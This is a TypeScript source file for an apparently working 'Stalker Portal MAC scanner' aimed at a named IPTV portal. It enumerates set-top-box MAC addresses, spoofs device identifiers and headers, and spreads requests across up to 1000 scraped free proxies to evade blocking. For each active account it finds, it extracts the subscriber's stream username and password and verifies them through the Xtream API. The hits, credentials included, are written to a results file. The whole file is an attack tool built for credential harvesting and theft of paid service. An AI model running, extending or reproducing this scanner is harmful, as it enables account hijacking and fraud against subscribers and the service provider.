/**
 * Stalker Portal MAC Scanner v2.3
 * VERIFIED PROXIES ONLY - Concurrency = 5x Working Proxies
 */

import * as fs from 'fs';
import * as crypto from 'crypto';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { HttpProxyAgent } from 'http-proxy-agent';

// ============== CONFIGURATION ==============
const MAC_PREFIX = '00:1A:79';
const PORTAL_URL = 'http://suiptv265.xyz';
const MIN_MONTHS_REMAINING = 3;
const REQUEST_TIMEOUT = 12000;
const MIN_CHANNEL_COUNT = 1;
const VERIFY_XTREAM_API = true;
const BATCH_DELAY_MS = 500; // 500ms delay between batches
const MAX_RETRIES = 2;

// Proxy settings
const USE_PROXIES = true;
const PROXY_REFRESH_INTERVAL = 2 * 60 * 1000; // Refresh every 2 min
const MIN_WORKING_PROXIES = 5;
const PROXY_TEST_TIMEOUT = 8000;
const CONCURRENCY_MULTIPLIER = 1; // 1 request per proxy
const PROXY_FAILURE_THRESHOLD = 15;
const MAX_VERIFIED_PROXIES = 1000; // Get 1000 proxies for 1000 concurrent requests
const NEVER_REMOVE_PROXIES = true;
// ===========================================

let CONCURRENCY = 1000; // Will match proxy count

const TOTAL_ADDRESSES = 0xFFFFFF + 1;
const TESTED_FILE = 'mac-scan-tested.json';
const RESULTS_FILE = 'mac-scan-valid.txt';

const API_PATHS = ['/c', '/c/server/load.php', '/portal.php', '/server/load.php', '/stalker_portal/server/load.php', '/stalker_portal/c'];
const STB_USER_AGENT = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';

// ============== TYPES ==============

interface ProxyInfo {
  host: string;
  port: number;
  url: string;
  failures: number;
  lastUsed: number;
}

interface DeviceIdentifiers {
  mac: string;
  serialNumber: string;
  deviceId: string;
  deviceId2: string;
  hwVersion2: string;
  signature: string;
}

interface ScanResult {
  mac: string;
  valid: boolean;
  accountId?: number;
  expiry?: string;
  months?: number;
  plan?: string;
  channelCount?: number;
  username?: string;
  password?: string;
  serverUrl?: string;
  maxConnections?: number;
  activeConnections?: number;
  error?: string;
}

// ============== GLOBALS ==============

let proxyList: ProxyInfo[] = [];
let lastProxyRefresh = 0;
let API_URL: string | null = null;
let tested = new Set<number>();
let validCount = 0;

// Free proxy sources
const PROXY_SOURCES = [
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  'https://proxylist.geonode.com/api/proxy-list?limit=200&page=1&sort_by=lastChecked&sort_type=desc&protocols=http',
  'https://www.proxy-list.download/api/v1/get?type=http',
];

// ============== PROXY MANAGEMENT ==============

async function fetchProxiesFromSource(url: string): Promise<string[]> {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
    const text = await res.text();
    try {
      const json = JSON.parse(text);
      if (json.data && Array.isArray(json.data)) {
        return json.data.map((p: any) => `${p.ip}:${p.port}`);
      }
    } catch {}
    const lines = text.split(/[\r\n]+/).filter(l => l.trim());
    const proxies: string[] = [];
    for (const line of lines) {
      const match = line.match(/(\d+\.\d+\.\d+\.\d+):(\d+)/);
      if (match) proxies.push(`${match[1]}:${match[2]}`);
    }
    return proxies;
  } catch {
    return [];
  }
}

async function refreshProxyList(): Promise<void> {
  console.log('\n[PROXY] Fetching fresh proxies...');
  
  const allProxies = new Set<string>();
  for (const source of PROXY_SOURCES) {
    const proxies = await fetchProxiesFromSource(source);
    proxies.forEach(p => allProxies.add(p));
    console.log(`   Found ${proxies.length} from ${new URL(source).hostname}`);
  }
  
  console.log(`[PROXY] Total unique proxies to test: ${allProxies.size}`);
  
  const newProxies: ProxyInfo[] = [];
  for (const proxy of allProxies) {
    const [host, portStr] = proxy.split(':');
    const port = parseInt(portStr);
    if (host && port) {
      newProxies.push({ host, port, url: `http://${host}:${port}`, failures: 0, lastUsed: 0 });
    }
  }
  
  // TEST PROXIES AGAINST THE ACTUAL PORTAL (not httpbin)
  console.log(`[PROXY] Testing proxies against ${PORTAL_URL}...`);
  const working: ProxyInfo[] = [];
  const BATCH_SIZE = 100; // Larger batches for speed
  
  for (let i = 0; i < newProxies.length; i += BATCH_SIZE) {
    const batch = newProxies.slice(i, i + BATCH_SIZE);
    const batchNum = Math.floor(i / BATCH_SIZE) + 1;
    const totalBatches = Math.ceil(newProxies.length / BATCH_SIZE);
    
    process.stdout.write(`   Batch ${batchNum}/${totalBatches}... `);
    
    const testResults = await Promise.all(
      batch.map(async (proxy) => {
        try {
          const agent = new HttpProxyAgent(proxy.url);
          // Test against the actual portal, not httpbin
          const res = await fetch(`${PORTAL_URL}/c/`, {
            // @ts-ignore
            agent,
            signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT),
            headers: { 'User-Agent': STB_USER_AGENT },
          });
          // Any response (even 404) means the proxy can reach the portal
          if (res.status < 500) return proxy;
        } catch {}
        return null;
      })
    );
    
    const batchWorking = testResults.filter(r => r !== null) as ProxyInfo[];
    working.push(...batchWorking);
    console.log(`${batchWorking.length} working (total: ${working.length})`);
    
    // Stop once we have enough verified proxies
    if (working.length >= MAX_VERIFIED_PROXIES) {
      console.log(`\n[PROXY] Reached ${MAX_VERIFIED_PROXIES} verified proxies, stopping.`);
      break;
    }
  }
  
  // ONLY use verified working proxies
  proxyList = working;
  lastProxyRefresh = Date.now();
  
  // Update concurrency to 5x the number of working proxies
  CONCURRENCY = Math.max(10, working.length * CONCURRENCY_MULTIPLIER);
  
  console.log(`\n[PROXY] VERIFIED WORKING: ${working.length}`);
  console.log(`[PROXY] CONCURRENCY SET TO: ${CONCURRENCY} (${working.length} x ${CONCURRENCY_MULTIPLIER})\n`);
}

function getProxy(): ProxyInfo | null {
  if (!USE_PROXIES || proxyList.length === 0) return null;
  
  // Sort by: least failures first, then least recently used
  const sorted = [...proxyList].sort((a, b) => {
    if (a.failures !== b.failures) return a.failures - b.failures;
    return a.lastUsed - b.lastUsed;
  });
  
  // Pick from the best proxies (lowest failures)
  const minFailures = sorted[0].failures;
  const best = sorted.filter(p => p.failures <= minFailures + 3);
  
  // Round-robin from the best ones
  const proxy = best[0];
  proxy.lastUsed = Date.now();
  return proxy;
}

function getWorkingProxyCount(): number {
  return proxyList.filter(p => p.failures < PROXY_FAILURE_THRESHOLD).length;
}

function reportProxyFailure(proxy: ProxyInfo | null) {
  if (proxy) {
    proxy.failures++;
    // Never remove proxies - just deprioritize them via failure count
    // They'll be skipped in getProxy() but kept for when we run low
    if (!NEVER_REMOVE_PROXIES && proxy.failures >= PROXY_FAILURE_THRESHOLD) {
      const idx = proxyList.indexOf(proxy);
      if (idx >= 0) proxyList.splice(idx, 1);
    }
  }
}

function reportProxySuccess(proxy: ProxyInfo | null) {
  // Reduce failures on success to rehabilitate proxies
  if (proxy) proxy.failures = Math.max(0, proxy.failures - 2);
}


// ============== DEVICE ID GENERATION ==============

function generateDeviceIds(mac: string): DeviceIdentifiers {
  const serialNumber = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13);
  const deviceId = crypto.createHash('sha256').update(serialNumber).digest('hex').toUpperCase();
  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
  const hwVersion2 = crypto.createHash('sha1').update(mac).digest('hex');
  const signature = crypto.createHash('sha256').update(serialNumber + mac).digest('hex').toUpperCase();
  return { mac, serialNumber, deviceId, deviceId2, hwVersion2, signature };
}

function buildCookies(ids: DeviceIdentifiers): string {
  return [
    `mac=${encodeURIComponent(ids.mac)}`,
    'stb_lang=en',
    'timezone=America/Los_Angeles',
    `adid=${ids.hwVersion2}`,
    `device_id=${ids.deviceId}`,
    `device_id2=${ids.deviceId2}`,
    `sn=${ids.serialNumber}`,
    'hw_version=1.7-BD-00',
  ].join('; ');
}

function buildHeaders(ids: DeviceIdentifiers, token?: string, random?: string): Record<string, string> {
  const headers: Record<string, string> = {
    'User-Agent': STB_USER_AGENT,
    'X-User-Agent': 'Model: MAG250; Link: WiFi',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Cookie': buildCookies(ids),
  };
  if (token) headers['Authorization'] = `Bearer ${token}`;
  if (random) headers['X-Random'] = random;
  return headers;
}

// ============== UTILITY FUNCTIONS ==============

function suffixToMac(suffix: number): string {
  const b4 = ((suffix >> 16) & 0xff).toString(16).toUpperCase().padStart(2, '0');
  const b5 = ((suffix >> 8) & 0xff).toString(16).toUpperCase().padStart(2, '0');
  const b6 = (suffix & 0xff).toString(16).toUpperCase().padStart(2, '0');
  return `${MAC_PREFIX}:${b4}:${b5}:${b6}`;
}

function parseJson(text: string): any {
  if (!text || text.trim().length === 0) return null;
  const clean = text.replace(/^\/\*-secure-\s*/, '').replace(/\s*\*\/$/, '');
  try { return JSON.parse(clean); } catch { return null; }
}

function monthsUntil(dateStr: string): number {
  if (!dateStr || dateStr.startsWith('0000-00-00')) return -1;
  try {
    const exp = new Date(dateStr);
    if (isNaN(exp.getTime())) return -1;
    return (exp.getTime() - Date.now()) / (1000 * 60 * 60 * 24 * 30);
  } catch { return -1; }
}

function extractCredentialsFromUrl(url: string): { username: string; password: string; server: string } | null {
  try {
    const match = url.match(/https?:\/\/([^\/]+)\/(?:live\/)?([^\/]+)\/([^\/]+)\//);
    if (match) return { server: match[1], username: match[2], password: match[3] };
  } catch {}
  return null;
}

async function safeFetch(
  url: string, 
  options: RequestInit, 
  timeoutMs: number,
  proxy?: ProxyInfo | null
): Promise<{ res: Response | null; proxy: ProxyInfo | null }> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const fetchOptions: any = { ...options, signal: controller.signal };
    if (proxy) {
      fetchOptions.agent = url.startsWith('https') 
        ? new HttpsProxyAgent(proxy.url)
        : new HttpProxyAgent(proxy.url);
    }
    const res = await fetch(url, fetchOptions);
    clearTimeout(timeout);
    reportProxySuccess(proxy || null);
    return { res, proxy: proxy || null };
  } catch {
    clearTimeout(timeout);
    reportProxyFailure(proxy || null);
    return { res: null, proxy: proxy || null };
  }
}

// ============== API ENDPOINT DETECTION ==============

async function findApiEndpoint(): Promise<string | null> {
  const testMac = suffixToMac(0);
  const ids = generateDeviceIds(testMac);
  for (const path of API_PATHS) {
    try {
      const url = `${PORTAL_URL}${path}?type=stb&action=handshake&token=&JsHttpRequest=1-xml`;
      const { res } = await safeFetch(url, { headers: buildHeaders(ids) }, 8000, null);
      if (!res) continue;
      const data = parseJson(await res.text());
      if (data?.js?.token) return `${PORTAL_URL}${path}`;
    } catch {}
  }
  return null;
}

// ============== MAIN CHECK FUNCTION ==============

async function checkMac(mac: string): Promise<ScanResult> {
  if (!API_URL) return { mac, valid: false, error: 'No API' };

  const ids = generateDeviceIds(mac);
  const proxy = USE_PROXIES ? getProxy() : null;

  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    const currentProxy = attempt === 0 ? proxy : (USE_PROXIES ? getProxy() : null);
    
    try {
      // STEP 1: HANDSHAKE
      const { res: handshakeRes } = await safeFetch(
        `${API_URL}?type=stb&action=handshake&token=&JsHttpRequest=1-xml`,
        { headers: buildHeaders(ids) }, REQUEST_TIMEOUT, currentProxy
      );
      if (!handshakeRes) {
        if (attempt < MAX_RETRIES - 1) { await new Promise(r => setTimeout(r, 300)); continue; }
        return { mac, valid: false, error: 'Connection failed' };
      }

      const handshakeData = parseJson(await handshakeRes.text());
      if (!handshakeData) return { mac, valid: false, error: 'Invalid response' };
      
      const token = handshakeData?.js?.token;
      const random = handshakeData?.js?.random || '';
      if (!token) return { mac, valid: false, error: 'Not registered' };

      // STEP 2: GET PROFILE
      const { res: profileRes } = await safeFetch(
        `${API_URL}?type=stb&action=get_profile&hd=1&num_banks=2&stb_type=MAG250&JsHttpRequest=1-xml`,
        { headers: buildHeaders(ids, token, random) }, REQUEST_TIMEOUT, currentProxy
      );
      if (!profileRes) return { mac, valid: false, error: 'Profile fetch failed' };

      const profileData = parseJson(await profileRes.text());
      const profile = profileData?.js;
      if (!profile) return { mac, valid: false, error: 'No profile data' };

      const accountId = parseInt(profile.id) || 0;
      if (accountId === 0) return { mac, valid: false, error: 'Invalid account' };
      if (profile.blocked === '1' || profile.blocked === 1) return { mac, valid: false, accountId, error: 'Blocked' };

      // STEP 3: GET ACCOUNT INFO
      const { res: accountRes } = await safeFetch(
        `${API_URL}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`,
        { headers: buildHeaders(ids, token, random) }, REQUEST_TIMEOUT, currentProxy
      );
      const accountData = accountRes ? parseJson(await accountRes.text()) : null;
      const accountInfo = accountData?.js;
      
      const expiry = profile.expire_billing_date || profile.end_date || profile.tariff_expired_date || accountInfo?.phone || '';
      const months = monthsUntil(expiry);
      if (months < 0) return { mac, valid: false, accountId, error: 'No subscription' };
      if (months < MIN_MONTHS_REMAINING) return { mac, valid: false, accountId, expiry, months, error: 'Expiring soon' };

      // STEP 4: GET ALL CHANNELS
      const { res: channelsRes } = await safeFetch(
        `${API_URL}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`,
        { headers: buildHeaders(ids, token, random) }, REQUEST_TIMEOUT, currentProxy
      );
      const channelsData = channelsRes ? parseJson(await channelsRes.text()) : null;
      const channelCount = channelsData?.js?.total_items || channelsData?.js?.data?.length || 0;
      if (channelCount < MIN_CHANNEL_COUNT) return { mac, valid: false, accountId, expiry, months, channelCount, error: 'No channels' };

      // STEP 5: CREATE STREAM LINK
      let username: string | undefined, password: string | undefined, serverUrl: string | undefined;
      const { res: linkRes } = await safeFetch(
        `${API_URL}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&JsHttpRequest=1-xml`,
        { headers: buildHeaders(ids, token, random) }, REQUEST_TIMEOUT, currentProxy
      );
      if (linkRes) {
        const linkData = parseJson(await linkRes.text());
        const creds = linkData?.js?.cmd ? extractCredentialsFromUrl(linkData.js.cmd) : null;
        if (creds) { username = creds.username; password = creds.password; serverUrl = creds.server; }
      }

      // STEP 6: XTREAM API (OPTIONAL)
      let maxConnections: number | undefined, activeConnections: number | undefined;
      if (VERIFY_XTREAM_API && username && password && serverUrl) {
        const { res: xtreamRes } = await safeFetch(
          `http://${serverUrl}/player_api.php?username=${username}&password=${password}`,
          {}, REQUEST_TIMEOUT, currentProxy
        );
        if (xtreamRes) {
          try {
            const xtreamData = await xtreamRes.json();
            if (xtreamData?.user_info) {
              maxConnections = parseInt(xtreamData.user_info.max_connections) || undefined;
              activeConnections = parseInt(xtreamData.user_info.active_cons) || 0;
              if (xtreamData.user_info.status && xtreamData.user_info.status !== 'Active') {
                return { mac, valid: false, accountId, expiry, months, channelCount, username, password, serverUrl, error: `Status: ${xtreamData.user_info.status}` };
              }
            }
          } catch {}
        }
      }

      // SUCCESS
      return {
        mac, valid: true, accountId, expiry, months,
        plan: profile.tariff_plan_name || accountInfo?.tariff_plan || 'Unknown',
        channelCount, username, password, serverUrl, maxConnections, activeConnections,
      };

    } catch (err) {
      if (attempt < MAX_RETRIES - 1) { await new Promise(r => setTimeout(r, 300)); continue; }
      const msg = err instanceof Error ? err.message : 'Error';
      return { mac, valid: false, error: msg.substring(0, 30) };
    }
  }
  return { mac, valid: false, error: 'Max retries' };
}


// ============== PROGRESS MANAGEMENT ==============

function loadProgress(): boolean {
  try {
    if (fs.existsSync(TESTED_FILE)) {
      const data = JSON.parse(fs.readFileSync(TESTED_FILE, 'utf-8'));
      if (data.prefix === MAC_PREFIX) {
        tested = new Set(data.tested);
        validCount = data.validCount || 0;
        return true;
      }
    }
  } catch {}
  return false;
}

function saveProgress() {
  fs.writeFileSync(TESTED_FILE, JSON.stringify({ prefix: MAC_PREFIX, tested: [...tested], validCount }));
}

function logValid(result: ScanResult) {
  const parts = [result.mac, `ID:${result.accountId}`, result.expiry, `${result.months?.toFixed(1)}mo`, result.plan, `${result.channelCount}ch`];
  if (result.username && result.password) parts.push(`${result.username}:${result.password}`);
  if (result.serverUrl) parts.push(result.serverUrl);
  if (result.maxConnections !== undefined) parts.push(`${result.activeConnections || 0}/${result.maxConnections}conn`);
  fs.appendFileSync(RESULTS_FILE, parts.join(' | ') + '\n');
}

function getRandomSuffixes(count: number): number[] {
  const results: number[] = [];
  const seen = new Set<number>();
  let attempts = 0;
  while (results.length < count && attempts < count * 50) {
    const suffix = Math.floor(Math.random() * TOTAL_ADDRESSES);
    if (!tested.has(suffix) && !seen.has(suffix)) { results.push(suffix); seen.add(suffix); }
    attempts++;
  }
  return results;
}

function formatTime(seconds: number): string {
  if (!isFinite(seconds) || seconds < 0) return 'inf';
  if (seconds < 60) return `${seconds.toFixed(0)}s`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)}m ${Math.floor(seconds % 60)}s`;
  return `${Math.floor(seconds / 3600)}h ${Math.floor((seconds % 3600) / 60)}m`;
}

// ============== MAIN SCANNER ==============

async function runScanner() {
  console.log('\n' + '='.repeat(70));
  console.log('  STALKER PORTAL MAC SCANNER v2.3');
  console.log('  VERIFIED PROXIES ONLY - Concurrency = 5x Working Proxies');
  console.log('='.repeat(70));
  
  console.log(`\nPortal: ${PORTAL_URL}`);
  console.log(`Prefix: ${MAC_PREFIX}:XX:XX:XX`);
  console.log(`Proxies: ${USE_PROXIES ? 'ENABLED (verified only)' : 'DISABLED'}`);
  console.log('-'.repeat(70));

  // Fetch and VERIFY all proxies first
  if (USE_PROXIES) {
    await refreshProxyList();
    if (proxyList.length < MIN_WORKING_PROXIES) {
      console.log(`\nWARNING: Only ${proxyList.length} verified proxies available!`);
      if (proxyList.length === 0) {
        console.log(`ERROR: No working proxies found. Exiting.`);
        return;
      }
    }
    console.log(`CONCURRENCY: ${CONCURRENCY} (${proxyList.length} proxies x ${CONCURRENCY_MULTIPLIER})`);
  } else {
    console.log(`Concurrency: ${CONCURRENCY} (no proxies)`);
  }

  console.log('\nDetecting API endpoint...');
  API_URL = await findApiEndpoint();
  if (!API_URL) {
    console.log('ERROR: Could not find Stalker API endpoint!');
    return;
  }
  console.log(`API: ${API_URL}\n`);

  const resumed = loadProgress();
  if (resumed && tested.size > 0) {
    console.log(`Resumed: ${tested.size.toLocaleString()} tested, ${validCount} valid\n`);
  } else {
    tested = new Set();
    validCount = 0;
    fs.writeFileSync(RESULTS_FILE, `# MAC Scan Results - ${PORTAL_URL}\n# Started: ${new Date().toISOString()}\n\n`);
    console.log('Starting fresh scan...\n');
  }

  const startTime = Date.now();
  let sessionTested = 0;
  let lastSave = Date.now();
  const errorCounts: Record<string, number> = {};
  let registeredCount = 0;
  let connectionErrors = 0;

  console.log('-'.repeat(70) + '\n');

  while (tested.size < TOTAL_ADDRESSES) {
    const suffixes = getRandomSuffixes(CONCURRENCY);
    if (suffixes.length === 0) break;

    const macs = suffixes.map(suffixToMac);
    const results = await Promise.all(macs.map(mac => checkMac(mac)));

    for (let i = 0; i < results.length; i++) {
      const result = results[i];
      tested.add(suffixes[i]);
      sessionTested++;

      if (result.valid) {
        validCount++;
        logValid(result);
        console.log(`\n*** HIT: ${result.mac} | ID:${result.accountId} | ${result.expiry} (${result.months?.toFixed(1)}mo)`);
        console.log(`    Plan: ${result.plan} | Channels: ${result.channelCount}`);
        if (result.username) console.log(`    Creds: ${result.username}:${result.password} @ ${result.serverUrl}`);
        console.log('');
      } else {
        const err = result.error || 'Unknown';
        errorCounts[err] = (errorCounts[err] || 0) + 1;
        if (err === 'Connection failed' || err === 'Invalid response') connectionErrors++;
        if (result.accountId && result.accountId > 0) {
          registeredCount++;
          console.log(`  [Account] ${result.mac} (ID:${result.accountId}) - ${result.error}`);
        }
      }
    }

    // Progress
    const elapsed = (Date.now() - startTime) / 1000;
    const rate = elapsed > 0 ? sessionTested / elapsed : 0;
    const pct = ((tested.size / TOTAL_ADDRESSES) * 100).toFixed(4);
    const eta = rate > 0 ? (TOTAL_ADDRESSES - tested.size) / rate : Infinity;

    const errSummary = Object.entries(errorCounts)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3)
      .map(([e, c]) => `${e}:${c}`)
      .join(' | ');

    const validResponses = sessionTested - connectionErrors;
    const successRate = sessionTested > 0 ? ((validResponses / sessionTested) * 100).toFixed(1) : '0';
    const workingProxies = USE_PROXIES ? getWorkingProxyCount() : 0;
    const proxyStatus = USE_PROXIES ? ` | Proxies:${workingProxies}/${proxyList.length}` : '';
    
    console.log(
      `[${tested.size.toLocaleString()}] ${pct}% | Valid:${validCount} | Accounts:${registeredCount} | ` +
      `${rate.toFixed(1)}/s | OK:${successRate}%${proxyStatus} | ETA:${formatTime(eta)}`
    );
    if (errSummary) console.log(`   ${errSummary}`);

    // Save periodically
    if (Date.now() - lastSave > 15000) { saveProgress(); lastSave = Date.now(); }

    // Refresh proxies periodically
    if (USE_PROXIES && Date.now() - lastProxyRefresh > PROXY_REFRESH_INTERVAL) {
      console.log('\n[PROXY] Refreshing proxy list...');
      await refreshProxyList();
    }

    // Batch delay
    if (BATCH_DELAY_MS > 0) await new Promise(r => setTimeout(r, BATCH_DELAY_MS));

    // If too many connection errors, refresh proxies
    if (connectionErrors > sessionTested * 0.5 && sessionTested > 100) {
      if (USE_PROXIES && proxyList.length < 20) {
        console.log('\n[PROXY] High error rate, refreshing proxies...');
        await refreshProxyList();
      } else {
        console.log('\nHigh connection error rate, adding delay...');
        await new Promise(r => setTimeout(r, 2000));
      }
      connectionErrors = 0;
    }
  }

  saveProgress();
  console.log('\n' + '='.repeat(70));
  console.log(`COMPLETE | Valid: ${validCount} | Tested: ${tested.size.toLocaleString()}`);
  console.log(`Results: ${RESULTS_FILE}`);
}

process.on('SIGINT', () => { console.log('\nSaving...'); saveProgress(); process.exit(0); });

runScanner().catch(err => { console.error('Error:', err); saveProgress(); });
